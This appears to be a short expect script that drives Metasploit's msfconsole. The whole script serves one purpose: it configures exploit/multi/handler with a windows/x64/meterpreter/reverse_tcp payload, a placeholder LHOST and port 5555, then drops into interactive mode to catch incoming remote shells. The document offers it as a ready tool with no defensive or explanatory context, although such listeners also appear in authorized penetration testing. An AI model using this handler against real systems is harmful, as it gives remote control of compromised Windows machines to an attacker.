spawn msfconsole -q

# Wait for a few seconds to ensure msfconsole starts
sleep 5

# Send commands to msfconsole using expect
send "use exploit/multi/handler\r"
send "set PAYLOAD windows/x64/meterpreter/reverse_tcp\r"
send "set LHOST [YOUR IP ADDRESS]\r"
send "set LPORT 5555\r"

# Keep the terminal open for interaction
interact
